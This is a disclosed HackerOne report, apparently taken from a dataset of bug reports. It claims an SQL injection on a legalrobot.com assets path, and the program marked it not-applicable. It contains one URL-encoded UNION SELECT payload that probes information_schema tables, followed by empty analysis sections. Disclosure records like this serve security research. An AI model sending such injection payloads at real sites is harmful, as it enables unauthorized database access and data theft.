---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '211988'
original_report_id: '211988'
title: sql injection vulnerablity found
weakness: SQL Injection
team_handle: legalrobot
created_at: '2017-03-09T14:44:54.357Z'
disclosed_at: '2017-10-13T18:46:52.692Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 5
tags:
- hackerone
- sql-injection
---

# sql injection vulnerablity found

## Metadata

- HackerOne Report ID: 211988
- Weakness: SQL Injection
- Program: legalrobot
- Disclosed At: 2017-10-13T18:46:52.692Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

a Blind Text Injection Differential vulnerablity was found on your site in the url :https://www.legalrobot.com/assets/icons 

a GET request made on GET /assets/icons/?v=9wr1emhXD568%3B'%20UNION%20SELECT%208%2C%20table_name%2C%20'vega'%20FROM%20information_schema.tables%20WHERE%20table_name%20like'%25 result up in vulnerablity

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
